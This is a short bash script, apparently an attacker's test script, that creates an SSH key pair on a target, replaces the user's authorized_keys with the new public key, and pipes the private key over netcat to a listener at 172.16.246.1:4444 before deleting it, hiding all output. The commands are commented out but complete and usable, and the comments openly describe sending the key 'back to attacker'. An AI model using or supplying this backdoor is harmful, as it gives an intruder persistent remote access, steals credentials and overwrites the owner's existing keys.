#!/bin/bash

#creates new ssh key, sends new private key back to attacker
#this works pretty well from VM to host right now
#just on host set up nc listen on port to receive key
#as long as ssh enabled no root required?

# cd ~ > /dev/null 2>&1
# mkdir .ssh > /dev/null 2>&1
# cd .ssh > /dev/null 2>&1
# ssh-keygen -f new_key -N "" -q 
# mv new_key.pub authorized_keys > /dev/null 2>&1
# cat new_key | nc 172.16.246.1 4444 -q 0 > /dev/null 2>&1
# rm new_key > /dev/null 2>&1
